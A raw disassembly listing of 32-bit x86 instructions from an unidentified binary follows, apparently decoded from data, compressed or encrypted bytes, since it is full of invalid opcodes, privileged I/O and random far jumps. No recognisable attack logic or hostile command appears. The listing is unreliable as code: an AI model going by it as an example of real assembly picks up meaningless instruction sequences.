  420a8d:	mov    bl,0xd6
  420a8f:	push   ecx
  420a90:	in     eax,0xd9
  420a92:	jb     0x2f5a6e41
  420a98:	loop   0x420a4c
  420a9a:	jle    0x420ae4
  420a9c:	jg     0x420af0
  420a9e:	or     eax,0xbf431d33
  420aa3:	push   ds
  420aa4:	jb     0x420abc
  420aa6:	jl     0x420a7b
  420aa8:	cmp    ch,BYTE PTR [edx+0x4a]
  420aab:	jne    0x420a3c
  420aad:	mov    cl,0x7a
  420aaf:	jmp    0x9647:0x9e5d30f0
  420ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ab7:	iret   
  420ab8:	mov    ecx,0x518b85cf
  420abd:	dec    ebx
  420abe:	jo     0x420b14
  420ac0:	pop    ebx
  420ac1:	fmul   DWORD PTR [edx+eax*1+0x2f]
  420ac5:	test   BYTE PTR [esi-0x71ae1c68],0x87
  420acc:	call   0x16803358
  420ad1:	lods   eax,DWORD PTR ds:[esi]
  420ad2:	call   0xc2c8:0xea65f573
  420ad9:	int    0x4a
  420adb:	fnstsw WORD PTR [ebx]
  420add:	pop    esi
  420ade:	xchg   di,ax
  420ae0:	push   ebp
  420ae1:	mov    edx,0x30fe4a54
  420ae6:	outs   dx,DWORD PTR ds:[esi]
  420ae7:	ficom  DWORD PTR [eax+0x26]
  420aea:	loopne 0x420ad7
  420aec:	nop
  420aed:	push   ds
  420aee:	fcom   QWORD PTR [ebx-0x2f]
  420af1:	xchg   ecx,eax
  420af2:	shr    DWORD PTR [edx+eiz*4-0x4],cl
  420af6:	xchg   esi,eax
  420af7:	mov    eax,0xe4c64874
  420afc:	aaa    
  420afd:	shr    DWORD PTR cs:[edi+ebx*8+0x34aabfcf],0xa4
  420b06:	aam    0x31
  420b08:	mov    bl,0xa8
  420b0a:	mov    dl,0xc2
  420b0c:	inc    esp
  420b0d:	push   0x2ea3e280
  420b12:	cwde   
  420b13:	or     ecx,esi
  420b15:	adc    BYTE PTR [ebp+0x18f8d2c5],al
  420b1b:	jo     0x420ac6
  420b1d:	sbb    eax,0xc589660b
  420b22:	popa   
  420b23:	aam    0xc3
  420b25:	inc    ecx
  420b26:	out    dx,eax
  420b27:	cli    
  420b28:	mov    al,0x5d
  420b2a:	or     bl,ah
  420b2c:	stos   BYTE PTR es:[edi],al
  420b2d:	jns    0x420af9
  420b2f:	jmp    0xa86578c8
  420b34:	clc    
  420b35:	add    DWORD PTR [eax+eiz*2+0x76],edx
  420b39:	pop    eax
  420b3a:	test   esp,ebp
  420b3c:	sub    al,0xe8
  420b3e:	push   eax
  420b3f:	test   al,0x33
  420b41:	pop    esp
  420b42:	mov    WORD PTR [edx+eiz*2],cs
  420b45:	(bad)  
  420b47:	pop    edx
  420b48:	inc    ecx
  420b49:	cwde   
  420b4a:	test   al,dl
  420b4c:	xchg   ebp,eax
  420b4d:	loop   0x420af1
  420b4f:	pusha  
  420b50:	(bad)  
  420b51:	loope  0x420b4d
  420b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b54:	jmp    0x7d2:0xb554b845
  420b5b:	mov    al,BYTE PTR [eax]
  420b5d:	in     al,0x42
  420b5f:	imul   BYTE PTR [edi]
  420b61:	jp     0x420b51
  420b63:	loope  0x420b89
  420b65:	mov    dh,0xb
  420b67:	lahf   
  420b68:	clc    
  420b69:	xor    al,0xe6
  420b6b:	xor    eax,0xa66703d0
  420b70:	pop    ebx
  420b71:	and    al,BYTE PTR ss:[edi-0x5a]
  420b75:	popa   
  420b76:	sbb    esp,DWORD PTR [esp+esi*4-0x27]
  420b7a:	adc    eax,0x8c3bc5b6
  420b7f:	mov    bl,0x6d
  420b81:	inc    edi
  420b82:	and    BYTE PTR [esi],0x2c
  420b85:	std    
  420b86:	clc    
  420b87:	hlt    
  420b88:	rcl    DWORD PTR [ebx+esi*2],0x4b
  420b8c:	clc    
  420b8d:	jnp    0x420bde
  420b8f:	cmp    edi,esi
  420b91:	jle    0x420b6c
  420b93:	add    edi,esp
  420b95:	ret    0xef63
  420b98:	xor    BYTE PTR ds:0xd6a85bd,ch
  420b9e:	add    ch,BYTE PTR [ebx-0x34]
  420ba1:	out    0x63,eax
  420ba3:	(bad)  
  420ba4:	xor    eax,0x4c093238
  420ba9:	mov    DWORD PTR [edx+0x40],edx
  420bac:	cli    
  420bad:	mov    bl,0x7b
  420baf:	or     eax,0x672c1fe
  420bb4:	dec    ebp
  420bb5:	fist   DWORD PTR [ecx+0x2d8c432f]
  420bbb:	fucom  st(7)
  420bbd:	mov    edx,0xc9c0413b
  420bc2:	pop    ss
  420bc3:	inc    edi
  420bc4:	dec    esi
  420bc5:	ret    
  420bc6:	fcomp  st(7)
  420bc8:	xor    al,0x84
  420bca:	push   0x3d97379c
  420bcf:	pop    ebx
  420bd0:	inc    esi
  420bd1:	jae    0x420c23
  420bd3:	retf   
  420bd4:	cmp    BYTE PTR [edi+0x628f6255],dh
  420bda:	clc    
  420bdb:	das    
  420bdc:	test   al,0xef
  420bde:	bound  edx,QWORD PTR [eax]
  420be0:	bound  ebp,QWORD PTR [edx-0x4e9fe5ae]
  420be6:	pop    esp
  420be7:	push   0x1b
  420be9:	mov    bh,0x1a
  420beb:	es iret 
  420bed:	shr    ebx,0xd3
  420bf0:	pop    edi
  420bf1:	push   edi
  420bf2:	inc    edx
  420bf3:	retf   
  420bf4:	or     ch,ch
  420bf6:	not    BYTE PTR [edi]
  420bf8:	mov    dl,0xc3
  420bfa:	es sub eax,0x633fb0b8
  420c00:	pop    edx
  420c01:	clc    
  420c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c03:	or     ah,ah
  420c05:	out    0xb7,al
  420c07:	inc    edi
  420c08:	ins    DWORD PTR es:[edi],dx
  420c09:	dec    esi
  420c0a:	bound  ebp,QWORD PTR [esi-0x41188857]
  420c10:	xor    BYTE PTR [eax-0x13e4d5f1],bl
  420c16:	pop    esi
  420c17:	pop    edx
  420c18:	sub    ebx,DWORD PTR [ebp-0x61]
  420c1b:	mov    eax,ds:0xd7a396d0
  420c20:	std    
  420c21:	xor    ah,BYTE PTR [edi-0x34]
  420c24:	sbb    BYTE PTR [ecx+ebp*1-0x6ae1dea9],cl
  420c2b:	mov    edi,0xc93badd
  420c30:	fld    TBYTE PTR [edi+0x6d]
  420c33:	sbb    DWORD PTR [ebx+eax*2],edx
  420c36:	icebp  
  420c37:	call   0x2b43f5e5
  420c3c:	imul   ebx,DWORD PTR [edx+0x32],0xffffffe4
  420c40:	fucom  st(5)
  420c42:	outs   dx,BYTE PTR ds:[esi]
  420c43:	ss pop edi
  420c45:	in     al,dx
  420c46:	push   ebx
  420c47:	idiv   DWORD PTR [ebx]
  420c49:	cmp    ebx,DWORD PTR [edx]
  420c4b:	and    BYTE PTR ds:0xddc41521,dl
  420c51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c52:	pop    edi
  420c53:	push   0xb8a32d33
  420c58:	pop    eax
  420c59:	or     DWORD PTR [ecx+0x4735ba44],eax
  420c5f:	push   ecx
  420c60:	lods   al,BYTE PTR ds:[esi]
  420c61:	leave  
  420c62:	sahf   
  420c63:	fdiv   QWORD PTR [eax]
  420c65:	add    esp,eax
  420c67:	add    dh,dl
  420c69:	das    
  420c6a:	clc    
  420c6b:	mov    cl,0x3d
  420c6d:	(bad)  
  420c6f:	(bad)  
  420c70:	std    
  420c71:	add    edi,eax
  420c73:	in     eax,dx
  420c74:	fsubr  DWORD PTR [edx+0x6aa1ada9]
  420c7a:	iret   
  420c7b:	xchg   edi,eax
  420c7c:	fst    DWORD PTR [esi-0x40]
  420c7f:	sahf   
  420c80:	sub    eax,0x73aa9f94
  420c85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c86:	or     edx,0xfffffff6
  420c89:	cmp    BYTE PTR [edx+0xe4d265f],bl
  420c8f:	sub    BYTE PTR [eax+0x4705c551],cl
  420c95:	aam    0xc7
  420c97:	imul   edx,eax,0x6b74a551
  420c9d:	sbb    esi,edx
  420c9f:	adc    DWORD PTR [eax+eiz*2-0x4d2d80bf],0xffffff85
  420ca7:	nop
  420ca8:	in     eax,0x35
  420caa:	xor    eax,0x71432384
  420caf:	jle    0x420ce2
  420cb1:	cmp    al,0x14
  420cb3:	xchg   esp,eax
  420cb4:	cmp    edx,DWORD PTR ds:0xf8ab0f72
  420cba:	lods   eax,DWORD PTR ds:[esi]
  420cbb:	inc    edx
  420cbc:	mov    edi,DWORD PTR [edx-0x41]
  420cbf:	ja     0x420cb6
  420cc1:	mov    ebx,DWORD PTR [edi+0x5b5018cc]
  420cc7:	mov    WORD PTR [ecx],cs
  420cc9:	jg     0x420c70
  420ccb:	test   edi,edx
  420ccd:	in     eax,dx
  420cce:	add    DWORD PTR [edi],esp
  420cd0:	xor    edi,0xffffffb1
  420cd3:	push   esp
  420cd4:	mov    dl,0x79
  420cd6:	out    dx,eax
  420cd7:	mov    edi,0x1dbc4e12
  420cdc:	sbb    esi,ebx
  420cde:	into   
  420cdf:	cld    
  420ce0:	test   DWORD PTR [eax+0x2d],ecx
  420ce3:	in     eax,dx
  420ce4:	pop    ebx
  420ce5:	inc    esi
  420ce6:	dec    ecx
  420ce7:	push   ds
  420ce8:	xor    bl,dl
  420cea:	int3   
  420ceb:	in     eax,dx
  420cec:	jmp    0xeba61760
  420cf1:	jns    0x420c88
  420cf3:	pop    fs
  420cf5:	lods   al,BYTE PTR ds:[esi]
  420cf6:	mov    al,0x3d
  420cf8:	cmp    ah,BYTE PTR [ebx+0x14]
  420cfb:	mov    ?,WORD PTR [ebp+0x3122e487]
  420d01:	mov    esi,eax
  420d03:	adc    dh,BYTE PTR [ebp-0x2a85062b]
  420d09:	dec    ecx
  420d0a:	leave  
  420d0b:	mov    edi,0xfe75639c
  420d10:	test   BYTE PTR [esi+0x10],ah
  420d13:	int3   
  420d14:	cmp    al,0xe9
  420d16:	icebp  
  420d17:	fmul   DWORD PTR fs:[ecx-0x12]
  420d1b:	hlt    
  420d1c:	retf   
  420d1d:	dec    edi
  420d1e:	jns    0x420cbf
  420d20:	sbb    BYTE PTR [edx+ebp*2+0x56f3750d],ch
  420d27:	mov    eax,DWORD PTR [ebx]
  420d29:	test   DWORD PTR [edx+0x301c15a3],0x70b73145
  420d33:	(bad)  
  420d34:	mov    ebx,0x8a778a51
  420d39:	rol    esi,0x3e
  420d3c:	push   ebx
  420d3d:	je     0x420ce7
  420d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d40:	mov    ah,bh
  420d42:	add    edx,eax
  420d44:	cmp    esi,ebp
  420d46:	xchg   ecx,eax
  420d47:	xor    BYTE PTR [ebx+0x6],cl
  420d4a:	shl    BYTE PTR [edi+0x16],0xf2
  420d4e:	xchg   BYTE PTR [ebp-0x5db1f18f],al
  420d54:	(bad)  
  420d55:	add    ch,BYTE PTR fs:[ebx-0x1532dfdd]
  420d5c:	shl    BYTE PTR [ebx+ecx*1+0x667970d1],1
  420d63:	mov    cs,WORD PTR [esi]
  420d65:	push   0x6fa1b4d8
  420d6a:	xchg   esp,eax
  420d6b:	push   ss
  420d6c:	jo     0x420d56
  420d6e:	pop    edx
  420d6f:	imul   ecx,DWORD PTR [edi+0x6c862f22],0x38c8756e
  420d79:	(bad)  
  420d7a:	shr    DWORD PTR ds:0xe35556dd,cl
  420d80:	add    eax,0x57db3e03
  420d85:	inc    edi
  420d86:	xchg   ebx,eax
  420d87:	adc    cl,dl
  420d89:	xchg   DWORD PTR [edx-0x14673b63],esi
  420d8f:	inc    ebx
  420d90:	pop    ds
  420d91:	stos   BYTE PTR es:[edi],al
  420d92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d93:	mov    ebx,0x4a0f6010
  420d98:	es add eax,0x18980b18
  420d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d9f:	mov    eax,ds:0x4f2503b
  420da4:	xor    ebx,DWORD PTR ss:[esi]
  420da7:	sbb    BYTE PTR [edi],bl
  420da9:	es inc esi
  420dab:	adc    eax,0x1449b5e8
  420db0:	adc    DWORD PTR [edx+0x3f758a64],0x5b674a3e
  420dba:	inc    esi
  420dbb:	xor    al,0xd
  420dbd:	stos   BYTE PTR es:[edi],al
  420dbe:	sbb    eax,0xbbcdc095
  420dc3:	aaa    
  420dc4:	mov    dl,0x97
  420dc6:	pop    ecx
  420dc7:	cwd    
  420dc9:	push   cs
  420dca:	(bad)  
  420dcb:	call   0xbb6f8c1f
  420dd0:	repnz xchg ebx,eax
  420dd2:	push   esi
  420dd3:	arpl   WORD PTR [eax],dx
  420dd5:	push   edx
  420dd6:	adc    ah,BYTE PTR [ebp-0x639fa84]
  420ddc:	out    0xec,eax
  420dde:	cs sbb al,0xbb
  420de1:	xor    edi,esp
  420de3:	push   0xbefff99e
  420de8:	sahf   
  420de9:	mov    eax,0xffb89ac4
  420dee:	pop    edi
  420def:	mov    cl,0x73
  420df1:	cmp    ecx,DWORD PTR [esi-0x3cf08935]
  420df7:	ins    DWORD PTR es:[edi],dx
  420df8:	sbb    DWORD PTR [ecx+0x79e6fcd1],edx
  420dfe:	sbb    eax,0x18681744
  420e03:	sbb    edi,DWORD PTR [edx+eiz*1+0xc45247f]
  420e0a:	in     al,dx
  420e0b:	push   ebx
  420e0c:	mov    WORD PTR [edi],gs
  420e0e:	mov    esp,0xe4a51e84
  420e13:	pop    es
  420e14:	jge    0x420e88
  420e16:	mov    BYTE PTR [ecx-0x216b4860],0x62
  420e1d:	mov    edi,0x17fae241
  420e22:	gs mov bl,0x9f
  420e25:	mov    ds:0xc0230289,al
  420e2a:	jge    0x420e89
  420e2c:	shl    DWORD PTR [esi],cl
  420e2e:	jb     0x420dee
  420e30:	mov    eax,0x5336688
  420e35:	mov    dl,0xd3
  420e37:	lods   al,BYTE PTR ds:[esi]
  420e38:	mov    ds:0xea910b7b,eax
  420e3d:	xchg   esp,eax
  420e3e:	test   BYTE PTR [ebx-0x34],al
  420e41:	daa    
  420e42:	mov    eax,ds:0xb8bbf040
  420e47:	clc    
  420e48:	out    0x75,al
  420e4a:	inc    ebx
  420e4b:	icebp  
  420e4c:	dec    esi
  420e4d:	dec    ebp
  420e4e:	inc    edx
  420e4f:	aad    0xb7
  420e51:	clc    
  420e52:	and    esi,DWORD PTR [edi+edi*8-0x7311318b]
  420e59:	int    0xab
  420e5b:	div    DWORD PTR [ecx+0x66]
  420e5e:	inc    ebx
  420e5f:	cmc    
  420e60:	dec    edi
  420e61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e62:	(bad)  
  420e64:	sub    ebp,ecx
  420e66:	jnp    0x420e62
  420e68:	hlt    
  420e69:	loope  0x420e5c
  420e6b:	inc    edi
  420e6c:	dec    ebx
  420e6d:	inc    esp
  420e6e:	pop    ds
  420e6f:	push   0xffffff84
  420e71:	outs   dx,BYTE PTR ds:[esi]
  420e72:	cmp    edi,DWORD PTR [ebx+0x7f7fb018]
  420e78:	ins    BYTE PTR es:[edi],dx
  420e79:	das    
  420e7a:	aaa    
  420e7b:	leave  
  420e7c:	ja     0x420e56
  420e7e:	inc    edi
  420e7f:	cld    
  420e80:	cmp    BYTE PTR [edi],al
  420e82:	lds    esp,FWORD PTR [edi-0x498afd63]
  420e88:	and    ah,BYTE PTR [edx-0x3d13320f]
  420e8e:	loop   0x420ef3
  420e90:	jb     0x420e93
  420e92:	xchg   edi,eax
  420e93:	xor    BYTE PTR [eax+ebx*8+0x63],bl
  420e97:	dec    ebx
  420e98:	jmp    DWORD PTR [ebx+0x35]
  420e9b:	es dec esi
  420e9d:	stos   BYTE PTR es:[edi],al
  420e9e:	imul   ecx,esi,0x8c86ec5b
  420ea4:	scas   al,BYTE PTR es:[edi]
  420ea5:	pushf  
  420ea6:	loop   0x420e7d
  420ea8:	pop    edi
  420ea9:	pop    ebx
  420eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eab:	mov    WORD PTR [eax+0x4d6e5075],ds
  420eb1:	jbe    0x420ec9
  420eb3:	rcr    BYTE PTR [edx-0x57],1
  420eb6:	stc    
  420eb7:	sub    al,0x57
  420eb9:	xlat   BYTE PTR ds:[ebx]
  420eba:	or     eax,0x4dcc9a60
  420ebf:	and    eax,0x6cfe64cb
  420ec4:	push   edi
  420ec5:	xor    cl,BYTE PTR [edi]
  420ec7:	test   DWORD PTR [esi],0x4dc889b4
  420ecd:	dec    esp
  420ece:	push   esp
  420ecf:	test   ch,bl
  420ed1:	mov    ds:0x551f5189,al
  420ed6:	sub    al,0x58
  420ed8:	and    edi,DWORD PTR [esi]
  420eda:	sub    BYTE PTR [eax+0x15],dl
  420edd:	inc    ecx
  420ede:	out    dx,eax
  420edf:	mov    ebx,0xb81e8c5f
  420ee4:	fldenv [ecx+eiz*4]
  420ee7:	or     DWORD PTR [ecx+ebp*1],edi
  420eea:	das    
  420eeb:	mov    ecx,0x92be3dd0
  420ef0:	(bad)  
  420ef2:	jecxz  0x420edd
  420ef4:	xchg   esp,eax
  420ef5:	mov    ds:0x5377a41b,al
  420efa:	xchg   esp,eax
  420efb:	fidiv  WORD PTR [ebx-0x20]
  420efe:	(bad)  
  420eff:	aas    
  420f00:	out    dx,al
  420f01:	ret    
  420f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f03:	add    DWORD PTR cs:[eax-0x7f],0xffffff84
  420f08:	addr16 test cl,bh
  420f0b:	cli    
  420f0c:	jmp    0x420eab
  420f0e:	(bad)  
  420f10:	js     0x420eb3
  420f12:	repz jae 0x420f5d
  420f15:	outs   dx,DWORD PTR ds:[esi]
  420f16:	mov    ebx,0xea26a88e
  420f1b:	int    0x8f
  420f1d:	xor    DWORD PTR [edi-0x2c],0x45
  420f21:	mov    ds,WORD PTR es:[ebx-0x3f363e1f]
  420f28:	pop    ecx
  420f29:	mov    WORD PTR [edx-0x4b],gs
  420f2c:	push   esi
  420f2d:	fs add eax,0x4c9a5f14
  420f33:	sar    BYTE PTR [ebp-0x43],0xe0
  420f37:	push   ss
  420f38:	lods   eax,DWORD PTR ds:[esi]
  420f39:	dec    esp
  420f3a:	sub    dl,BYTE PTR [ebx]
  420f3c:	sub    eax,0x782ef544
  420f41:	es retf 
  420f43:	gs push edi
  420f45:	std    
  420f46:	xchg   ebx,eax
  420f47:	in     al,0xe7
  420f49:	stc    
  420f4a:	dec    eax
  420f4b:	jo     0x420f5a
  420f4d:	push   ebx
  420f4e:	lahf   
  420f4f:	rol    BYTE PTR [ecx+ebp*2+0x692bc363],cl
  420f56:	jnp    0x420f68
  420f58:	mov    ds:0x4d4bdfdd,eax
  420f5d:	fdiv   QWORD PTR [edx-0x3b]
  420f60:	iret   
  420f61:	jmp    0xf4d542ce
  420f66:	fmulp  st(2),st
  420f68:	pop    ebx
  420f69:	lahf   
  420f6a:	inc    ebp
  420f6b:	xchg   ebx,eax
  420f6c:	cs das 
  420f6e:	sahf   
  420f6f:	push   esi
  420f71:	stc    
  420f72:	sahf   
  420f73:	adc    DWORD PTR [ecx-0x44],ebp
  420f76:	aad    0x3a
  420f78:	repz sti 
  420f7a:	adc    bl,BYTE PTR [edi+ecx*1-0x78]
  420f7e:	inc    esp
  420f7f:	mov    ebp,0x7e6705e3
  420f84:	adc    al,0x1f
  420f87:	aam    0x28
  420f89:	jb     0x420fda
  420f8b:	add    eax,0x37f5e846
  420f90:	cli    
  420f91:	imul   ecx,DWORD PTR [ecx+0x2c08476b],0xb7cce0ae
  420f9b:	pop    eax
  420f9c:	imul   esi,DWORD PTR [esi+0x3f],0xffffff81
  420fa0:	aad    0xe5
  420fa2:	xchg   edi,eax
  420fa3:	in     eax,0x83
  420fa5:	div    DWORD PTR [edx-0x12]
  420fa8:	sub    eax,0x42987cd1
  420fad:	mov    eax,0x60dd6aa3
  420fb2:	jne    0x420fca
  420fb4:	shl    BYTE PTR ds:0xaaa22444,cl
  420fba:	ds inc edi
  420fbc:	leave  
  420fbd:	add    eax,0xe2f9429
  420fc2:	jle    0x420fa1
  420fc4:	and    ebp,DWORD PTR [eax]
  420fc6:	xchg   BYTE PTR [edi-0x3a28a1fb],bl
  420fcc:	sub    BYTE PTR [ecx+0xf],cl
  420fcf:	mov    edx,0xf50be23
  420fd4:	push   cs
  420fd5:	loopne 0x421050
  420fd7:	lahf   
  420fd8:	int3   
  420fd9:	xchg   esp,eax
  420fda:	push   esp
  420fdb:	int    0x34
  420fdd:	in     eax,0xd
  420fdf:	sahf   
  420fe0:	mov    esi,0x39189c40
  420fe5:	inc    ecx
  420fe6:	mov    ecx,0x6a12f68a
  420feb:	(bad)  
  420fec:	js     0x420fcd
  420fee:	push   esi
  420fef:	xchg   esp,eax
  420ff0:	xchg   esp,eax
  420ff1:	mov    DWORD PTR [edi+0x6a],0x46e5386c
  420ff8:	test   al,0x2b
  420ffa:	mov    ebx,0xd5e4ab3f
  420fff:	cmp    al,0x96
  421001:	add    eax,0xf6fcf73d
  421006:	adc    al,0xb9
  421008:	jmp    0x420fff
  42100a:	sbb    eax,ecx
  42100c:	(bad)  
  42100d:	repnz dec eax
  42100f:	retf   
  421010:	loop   0x421065
  421012:	add    DWORD PTR [eax-0x7d],esi
  421015:	das    
  421016:	mov    bh,0x3f
  421018:	push   edi
  421019:	retf   
  42101a:	adc    dl,dl
  42101c:	jecxz  0x421062
  42101e:	(bad)  [edx+ecx*4-0x2ceccb71]
  421025:	xor    BYTE PTR [edi+0x49],bl
  421028:	ret    0xc286
  42102b:	rol    DWORD PTR [ebx+0x64100ecf],cl
  421031:	aas    
  421032:	push   edi
  421033:	adc    ch,BYTE PTR [edi-0x660b18b9]
  421039:	mov    edi,DWORD PTR [ecx]
  42103b:	gs sub dl,0x4d
  42103f:	sub    DWORD PTR [ecx-0x2ec08aef],ebp
  421045:	add    cl,ch
  421047:	(bad)  
  421048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421049:	mov    dl,0x4b
  42104b:	ins    BYTE PTR es:[edi],dx
  42104c:	in     eax,dx
  42104d:	sub    DWORD PTR [ebx+edx*4],edi
  421050:	cmp    cl,ch
  421052:	(bad)  
  421053:	cmp    DWORD PTR [eax],ecx
  421055:	mov    edx,0xfeb5e9a5
  42105a:	xchg   edx,eax
  42105b:	(bad)  
  42105c:	jp     0x420ffc
  42105e:	(bad)  
  42105f:	dec    ebp
  421060:	push   ebp
  421061:	arpl   WORD PTR [edi+0xeebe5f8],bx
  421067:	retf   
  421068:	mov    eax,0x7ac44f4b
  42106d:	icebp  
  42106e:	xchg   ecx,eax
  42106f:	push   eax
  421070:	push   eax
  421071:	or     esi,DWORD PTR [ecx-0x32]
  421074:	push   ecx
  421075:	clc    
  421076:	xchg   edi,eax
  421077:	xchg   DWORD PTR [edx+0x60765646],eax
  42107d:	jmp    0xe842:0x911ad505
  421084:	fadd   QWORD PTR [ebx]
  421086:	rcl    DWORD PTR [esi],0xff
  421089:	xor    DWORD PTR [ecx],esi
  42108b:	(bad)
  42108f:	cmp    BYTE PTR [ebp+0x19761bfb],0x13
  421096:	xor    eax,0xf7e79303
  42109b:	fst    QWORD PTR [esi-0x23]
  42109e:	loope  0x42105f
  4210a0:	cmp    bh,bl
  4210a2:	scas   eax,DWORD PTR es:[edi]
  4210a3:	ss pop ebx
  4210a5:	adc    DWORD PTR [eax+0x391f7bd3],0x28
  4210ac:	xchg   edx,eax
  4210ad:	retf   
  4210ae:	std    
  4210af:	dec    ebx
  4210b0:	mov    ebp,0xada26cdb
  4210b5:	call   0x9713d666
  4210ba:	lea    esi,ds:[ecx]
  4210bd:	(bad)  
  4210bf:	in     eax,0x14
  4210c1:	test   DWORD PTR ds:0xeadeab9f,ecx
  4210c7:	push   eax
  4210c8:	stos   DWORD PTR es:[edi],eax
  4210c9:	adc    eax,0xbb4a9f1a
  4210ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210cf:	xchg   edi,eax
  4210d0:	das    
  4210d1:	outs   dx,BYTE PTR ds:[esi]
  4210d2:	rcr    BYTE PTR [eax+0x2fdd2bf],0xdb
  4210d9:	out    dx,eax
  4210da:	repz mov ecx,0x37587fae
  4210e0:	xchg   esp,eax
  4210e1:	mov    esp,0x9befc8b9
  4210e6:	enter  0xf0ae,0x9d
  4210ea:	retf   0x6b2e
  4210ed:	sti    
  4210ee:	cmp    BYTE PTR [ebx],cl
  4210f0:	mov    ch,0x2d
  4210f2:	ret    0xa059
  4210f5:	(bad)  [eax-0x50e94542]
  4210fb:	das    
  4210fc:	(bad)  
  4210fd:	and    cl,BYTE PTR [eax+0x17]
  421100:	sbb    al,0x7
  421102:	mov    ch,0xb7
  421104:	fild   WORD PTR [esi-0x38]
  421107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421108:	lock sbb cl,BYTE PTR [esi+ecx*1]
  42110c:	mov    edi,eax
  42110e:	dec    ebx
  42110f:	adc    al,0x90
  421111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421112:	push   ds
  421113:	push   esi
  421114:	push   esp
  421115:	mov    ?,WORD PTR [ebx+0x4a]
  421118:	sub    edx,esp
  42111a:	js     0x4210e4
  42111c:	stos   BYTE PTR es:[edi],al
  42111d:	and    al,0xec
  42111f:	push   ds
  421120:	mov    dl,0xd8
  421122:	dec    eax
  421123:	or     eax,0xa9bc0386
  421128:	pop    ebp
  421129:	pushf  
  42112a:	enter  0x3fbe,0x59
  42112e:	dec    esi
  42112f:	add    eax,0x9931376f
  421134:	push   edx
  421135:	shl    BYTE PTR [edx-0x42],1
  421138:	out    0x34,eax
  42113a:	cmp    DWORD PTR [eax+edx*1-0x4e5d2f8f],ebx
  421141:	mov    al,0x3e
  421143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421144:	sbb    al,0x94
  421146:	retf   
  421147:	jae    0x421180
  421149:	loop   0x42110f
  42114b:	sti    
  42114c:	lock outs dx,BYTE PTR ds:[esi]
  42114e:	jbe    0x4211bf
  421150:	hlt    
  421151:	lods   eax,DWORD PTR ds:[esi]
  421152:	sub    bh,BYTE PTR [esi]
  421154:	gs hlt 
  421156:	sbb    BYTE PTR [eax],ch
  421158:	rcl    BYTE PTR [ebx-0x60917402],1
  42115e:	inc    edx
  42115f:	pop    ecx
  421160:	into   
  421161:	ret    0xdd8b
  421164:	mov    eax,0x336e753
  421169:	cmp    esi,ebp
  42116b:	cmp    al,0xab
  42116d:	stos   BYTE PTR es:[edi],al
  42116e:	psrad  mm5,QWORD PTR [edi]
  421171:	pinsrw mm2,WORD PTR [ecx],0x9
  421175:	loope  0x42118d
  421177:	add    ebx,DWORD PTR [ebp-0x64]
  42117a:	mul    BYTE PTR [esi]
  42117c:	xor    ebx,DWORD PTR [eax+0x1e021f72]
  421182:	xor    ecx,ebp
  421184:	push   ss
  421185:	cli    
  421186:	inc    ecx
  421187:	(bad)  
  421188:	pop    edx
  421189:	inc    esi
  42118a:	inc    esi
  42118b:	mov    ah,0x19
  42118d:	rcl    BYTE PTR [ebx+0x5c02c95a],cl
  421193:	dec    ebp
  421194:	or     esp,DWORD PTR [ecx]
  421196:	add    DWORD PTR [esi-0x6ae64460],ebp
  42119c:	in     eax,0x6
  42119e:	xchg   ebx,eax
  42119f:	sahf   
  4211a0:	adc    DWORD PTR [ebp+eax*4-0x5843b8f0],esp
  4211a7:	(bad)  
  4211a8:	dec    esp
  4211a9:	mov    ebx,0x7db7d1fa
  4211ae:	lods   eax,DWORD PTR ds:[esi]
  4211af:	jns    0x42121b
  4211b1:	std    
  4211b2:	aaa    
  4211b3:	inc    edx
  4211b4:	cmp    eax,0xeb820cdf
  4211b9:	fldenv [ecx]
  4211bb:	and    al,0x4
  4211bd:	cdq    
  4211be:	xchg   DWORD PTR [ebx-0x1427e6cd],esp
  4211c4:	jp     0x42116e
  4211c6:	mov    DWORD PTR [edi-0x63],0xd45201b1
  4211cd:	ins    BYTE PTR es:[edi],dx
  4211ce:	sub    al,0xd
  4211d0:	aas    
  4211d1:	push   edx
  4211d2:	xchg   esp,eax
  4211d3:	out    0xf1,al
  4211d5:	imul   edi
  4211d7:	and    edx,DWORD PTR [ebp-0x57]
  4211da:	stos   BYTE PTR es:[edi],al
  4211db:	fwait
  4211dc:	xchg   esp,eax
  4211dd:	das    
  4211de:	sbb    eax,0xb5c02920
  4211e3:	mov    ds:0x1edf1bd8,eax
  4211e8:	(bad)  
  4211e9:	in     eax,0xc6
  4211eb:	addr16 (bad) 
  4211ed:	fucomp st(1)
  4211ef:	aad    0xb2
  4211f1:	mov    eax,ds:0x1a10c003
  4211f6:	scas   al,BYTE PTR es:[edi]
  4211f7:	push   edx
  4211f8:	inc    eax
  4211f9:	pop    ebx
  4211fa:	jae    0x421191
  4211fc:	xchg   esp,eax
  4211fd:	aas    
  4211fe:	enter  0x3d04,0x43
  421202:	sbb    esp,DWORD PTR [esi]
  421204:	dec    eax
  421205:	mov    esi,0x93e3e66
  42120a:	push   ecx
  42120b:	jle    0x42126f
  42120d:	cmp    ebx,edi
  42120f:	push   ds
  421210:	push   ecx
  421211:	pop    eax
  421212:	das    
  421213:	jb     0x421196
  421215:	fdiv   st(0),st
  421217:	xor    BYTE PTR [eax],ch
  421219:	frstor [edx]
  42121b:	(bad)  
  42121c:	jb     0x421273
  42121e:	inc    ecx
  42121f:	cmp    ecx,DWORD PTR [ecx+0x3303af06]
  421225:	xchg   ecx,eax
  421226:	shl    DWORD PTR [edx-0x78c5fce2],1
  42122c:	or     BYTE PTR fs:[edx+0x6d],ch
  421230:	cmp    edi,edx
  421232:	fucomip st,st(0)
  421234:	or     eax,0xb6632047
  421239:	mov    DWORD PTR [ebx+0x1e33c11],eax
